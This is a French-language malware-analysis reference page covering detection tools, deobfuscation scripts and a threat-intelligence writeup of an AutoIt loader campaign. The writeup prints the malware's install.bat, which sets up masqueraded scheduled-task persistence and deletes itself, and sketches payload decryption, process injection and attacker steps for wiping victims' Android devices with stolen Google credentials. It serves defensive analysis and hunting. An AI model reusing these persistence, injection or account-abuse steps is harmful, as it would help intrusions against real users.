# Analyse de malware

{{#include ../../banners/hacktricks-training.md}}

## Fiches Forensics

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Services en ligne

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Outils antivirus et de détection hors ligne

### Yara

#### Installation
```bash
sudo apt-get install -y yara
```
#### Préparer les règles

Utilisez ce script pour télécharger et fusionner toutes les yara rules pour malware depuis github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Créez le répertoire _**rules**_ et exécutez-le. Cela créera un fichier appelé _**malware_rules.yar**_ qui contient toutes les yara rules pour malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Analyse
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen : Vérifier la présence de malware et créer des rules

Vous pouvez utiliser l'outil [**YaraGen**](https://github.com/Neo23x0/yarGen) pour générer des yara rules à partir d'un binaire. Consultez ces tutoriels : [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Installation
```
sudo apt-get install -y clamav
```
#### Analyse
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** détecte des **capacités** potentiellement malveillantes dans les exécutables : PE, ELF, .NET. Il trouvera donc des éléments tels que Att\&ck tactics, ou des capacités suspectes telles que :

- vérifier une erreur OutputDebugString
- exécuter en tant que service
- créer un processus

Récupérez-le dans le [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC signifie Indicateur de compromission. Un IOC est un ensemble de **conditions qui identifient** certains logiciels potentiellement indésirables ou des **malware** confirmés. Les Blue Teams utilisent ce type de définition pour **rechercher ce type de fichiers malveillants** dans leurs **systèmes** et **réseaux**.\
Partager ces définitions est très utile : lorsqu'un **malware** est identifié sur un poste et qu'un IOC pour ce **malware** est créé, d'autres Blue Teams peuvent l'utiliser pour identifier le **malware** plus rapidement.

Un outil pour créer ou modifier des IOCs est [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Vous pouvez utiliser des outils tels que [**Redline**](https://www.fireeye.com/services/freeware/redline.html) pour **rechercher des IOCs définis sur un appareil**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) est un scanner d'indicateurs simples de compromission.\
La détection est basée sur quatre méthodes de détection :
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) est un scanner de malware pour Linux distribué sous la licence GNU GPLv2, conçu pour les menaces rencontrées dans les environnements d'hébergement mutualisé. Il utilise des données de menace provenant de systèmes de détection d'intrusion en périphérie réseau pour extraire les malwares activement utilisés dans des attaques et génère des signatures pour leur détection. De plus, les données de menace proviennent aussi de soumissions d'utilisateurs via la fonctionnalité LMD checkout et de ressources communautaires sur les malwares.

### rkhunter

Des outils comme [**rkhunter**](http://rkhunter.sourceforge.net) peuvent être utilisés pour vérifier le système de fichiers à la recherche de **rootkits** possibles et de malwares.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) est un outil qui va tenter de trouver des obfuscated strings dans les exécutables en utilisant différentes techniques.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) vérifie quelques éléments basiques à l'intérieur de l'exécutable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) est un outil qui permet d'obtenir des informations sur les exécutables Windows telles que imports, exports, headers, mais vérifiera également VirusTotal et trouvera des techniques Att\&ck potentielles.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) est un outil pour détecter si un fichier est **encrypted** et aussi trouver des **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is un script Python qui utilise une variété de **statistical methods** pour détecter du contenu **obfuscated** et **encrypted** dans des fichiers texte/script. Le but de NeoPI est d'aider à la **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) fait de son mieux pour détecter du **obfuscated**/**dodgy code** ainsi que des fichiers utilisant des fonctions **PHP** souvent utilisées dans des **malwares**/webshells.

### Apple Binary Signatures

When checking some **malware sample** you should always **check the signature** of the binary as the **developer** that signed it may be already **related** with **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Techniques de détection

### File Stacking

Si vous savez qu'un dossier contenant les **fichiers** d'un serveur web a été **mis à jour pour la dernière fois à une certaine date**, **vérifiez** la **date** de création et de modification **de tous les fichiers** du **serveur web** et si une date est **suspecte**, examinez ce fichier.

### Baselines

Si les fichiers d'un dossier **n'auraient pas dû être modifiés**, vous pouvez calculer le **hash** des **fichiers originaux** du dossier et les **comparer** avec ceux **actuels**. Tout élément modifié sera **suspect**.

### Statistical Analysis

Lorsque l'information est enregistrée dans des logs, vous pouvez **vérifier des statistiques comme combien de fois chaque fichier d'un serveur web a été accédé**, car un web shell pourrait être l'un des fichiers les plus consultés.

---

### Android in-app native telemetry (no root)

Sur Android, vous pouvez instrumenter du code natif à l'intérieur du processus de l'application cible en préchargeant une petite bibliothèque de logging avant l'initialisation des autres libs JNI. Cela donne une visibilité précoce sur le comportement natif sans hooks système ni root. Une approche populaire est SoTap : déposer libsotap.so pour le bon ABI dans l'APK et injecter un appel System.loadLibrary("sotap") tôt (par ex., initialiseur static ou Application.onCreate), puis collecter les logs depuis des chemins internes/externes ou, en fallback, Logcat.

Voir la page sur le reversing natif Android pour les détails d'installation et les chemins de logs :

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Certains malwares Android et des apps protégées par RASP cachent les noms et signatures des méthodes JNI en les décodant à l'exécution avant d'appeler RegisterNatives. Quand l'instrumentation Frida/ptrace est interrompue par de l'anti-debug, vous pouvez toujours récupérer le plaintext hors ligne en exécutant le décodeur inclus dans le binaire avec angr puis en réinjectant les résultats dans Ghidra sous forme de commentaires.

Idée clé : traiter le décodeur à l'intérieur du .so comme une fonction appelable, l'exécuter sur les blobs d'octets obfusqués dans .rodata, et concrétiser les octets de sortie jusqu'au premier \x00 (C-string terminator). Gardez angr et Ghidra avec la même image base pour éviter les décalages d'adresses.

Workflow overview
- Triage in Ghidra : identifier le décodeur et sa convention d'appel/arguments dans JNI_OnLoad et la configuration de RegisterNatives.
- Run angr (CPython3) pour exécuter le décodeur pour chaque chaîne cible et exporter les résultats.
- Annotate in Ghidra : commenter automatiquement les chaînes décodées à chaque point d'appel pour une reconstruction rapide des JNI.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>Configuration angr et exécution hors ligne du décodeur</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- À grande échelle, construisez une static map des call sites vers les arguments du decoder (encoded_ptr, size). Les wrappers peuvent masquer les arguments, donc vous pouvez créer cette mapping manuellement à partir des Ghidra xrefs si la récupération de l'API est bruyante.

<details>
<summary>Décoder par lot plusieurs call sites avec angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Annotate call sites in Ghidra
Option A: Jython-only comment writer (use a pre-computed JSON)
- Étant donné qu'angr requiert CPython3, gardez la déobfuscation et l'annotation séparées. Exécutez d'abord le script angr ci‑dessus pour produire decoded_strings.json. Puis exécutez ce GhidraScript Jython pour écrire des PRE_COMMENTs à chaque call site (et inclure le nom de la fonction appelante pour le contexte) :

<details>
<summary>Script Jython Ghidra pour annoter les chaînes JNI décodées</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B : un seul script CPython via pyhidra/ghidra_bridge
- Alternativement, utilisez pyhidra ou ghidra_bridge pour piloter l'API de Ghidra depuis le même processus CPython exécutant angr. Cela permet d'appeler decode_string() et de définir immédiatement des PRE_COMMENTs sans fichier intermédiaire. La logique reflète le script Jython : construire une map callsite→function via ReferenceManager, décoder avec angr, et définir les commentaires.

Pourquoi cela fonctionne et quand l'utiliser
- L'exécution hors ligne évite le RASP/anti-debug : pas de ptrace, pas de hooks Frida nécessaires pour récupérer les chaînes.
- Garder Ghidra et angr base_addr alignés (par ex., 0x00100000) garantit que les adresses de fonctions/données correspondent entre les outils.
- Recette reproductible pour les décodeurs : traiter la transformation comme une fonction pure, allouer un tampon de sortie dans un état neuf, l'appeler avec (encoded_ptr, out_ptr, len), puis concrétiser via state.solver.eval et parser les C-strings jusqu'à \x00.

Notes et pièges
- Respectez l'ABI/convention d'appel cible. angr.factory.callable en choisit une selon l'arch ; si les arguments semblent décalés, spécifiez cc explicitement.
- Si le décodeur attend des tampons de sortie initialisés à zéro, initialisez outbuf avec des zéros dans l'état avant l'appel.
- Pour les .so Android position-independent, fournissez toujours base_addr afin que les adresses dans angr correspondent à celles vues dans Ghidra.
- Utilisez currentProgram.getReferenceManager() pour énumérer les call-xrefs même si l'app enveloppe le décodeur derrière des stubs légers.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Déobfuscation du flux de contrôle dynamique (dispatchers JMP/CALL RAX)

Les familles de malware modernes abusent fortement de l'obfuscation du graphe de flux de contrôle (CFG) : au lieu d'un saut/call direct, elles calculent la destination à l'exécution et exécutent un `jmp rax` ou `call rax`. Un petit *dispatcher* (typiquement neuf instructions) fixe la cible finale en fonction des flags CPU `ZF`/`CF`, rompant complètement la récupération statique du CFG.

La technique — mise en évidence par le loader SLOW#TEMPEST — peut être contrée avec un workflow en trois étapes qui ne repose que sur IDAPython et l'émulateur CPU Unicorn.

### 1. Localiser chaque jump / call indirect
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Extraire le byte-code du dispatcher
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Émulez-le deux fois avec Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Exécutez `run(code,0,0)` et `run(code,1,1)` pour obtenir les cibles des branches *false* et *true*.

### 4. Rétablir un saut / appel direct
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Après le patch, forcez IDA à réanalyser la fonction afin que le CFG complet et la sortie Hex-Rays soient restaurés :
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Marquer les appels API indirects

Une fois que la destination réelle de chaque `call rax` est connue, vous pouvez indiquer à IDA ce que c'est afin que les types de paramètres & les noms de variables soient récupérés automatiquement :
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Avantages pratiques

* Restaure le vrai CFG → la décompilation passe de *10* lignes à des milliers.
* Permet string-cross-reference & xrefs, rendant la reconstruction du comportement triviale.
* Les scripts sont réutilisables : déposez-les dans n'importe quel loader protégé par la même astuce.

---

## Loaders basés sur AutoIt : .a3x decryption, Task Scheduler masquerade and RAT injection

Ce schéma d'intrusion enchaîne un MSI signé, des AutoIt loaders compilés en .a3x, et une tâche Task Scheduler se faisant passer pour une application bénigne.

### MSI → custom actions → AutoIt orchestrator

Arbre des processus et commandes exécutées par les custom actions du MSI :

- MsiExec.exe → cmd.exe pour exécuter install.bat
- WScript.exe pour afficher une boîte de dialogue d'erreur factice
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (dépose loader, met en place persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (leurre utilisateur):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Dépose AutoIt3.exe et IoKlTr.au3 dans C:\Users\Public\Music
- Copie schtasks.exe en hwpviewer.exe (se fait passer pour le viewer de Hangul Word Processor)
- Crée une scheduled task "IoKlTr" qui s'exécute toutes les 1 minute
- Startup LNK observé comme Smart_Web.lnk ; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Place des modules sous %APPDATA%\Google\Browser\ dans des sous-dossiers contenant `adb` ou `adv` et les démarre via les helpers autoit.vbs/install.bat

Forensic triage tips:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Look for renamed copies of schtasks.exe co-located with Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Common paths: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Correlate process creation: AutoIt3.exe spawning legitimate Windows binaries (e.g., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders et déchiffrement des payloads .a3x → injection

- Les modules AutoIt sont compilés avec `#AutoIt3Wrapper_Outfile_type=a3x` et déchiffrent les payloads embarqués avant de les injecter dans des processus benignes.
- Familles observées : QuasarRAT (injecté dans hncfinder.exe) et RftRAT/RFTServer (injecté dans cleanmgr.exe), ainsi que des modules RemcosRAT (`Remcos\RunBinary.a3x`).
- Schéma de déchiffrement : dériver une clé AES via HMAC, déchiffrer le blob embarqué, puis injecter le module en clair.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspendu) du processus hôte cible (p.ex., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory avec le module/shellcode déchiffré
- CreateRemoteThread ou QueueUserAPC pour exécuter le payload

Hunting ideas
- AutoIt3.exe dont le parent est MsiExec.exe ou WScript.exe, lançant des utilitaires système
- Fichiers avec extension `.a3x` ou AutoIt script runners sous des chemins publics/écrits par l'utilisateur
- Tâches planifiées suspectes exécutant AutoIt3.exe ou des binaires non signés par Microsoft, avec des déclencheurs à l'échelle de la minute

### Abus de prise de contrôle de compte via Android Find My Device (Find Hub)

Pendant l'intrusion Windows, les opérateurs ont utilisé des identifiants Google volés pour effacer à plusieurs reprises les appareils Android de la victime, supprimant les notifications pendant qu'ils étendaient l'accès via le messenger de bureau où la victime était connectée.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Références

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
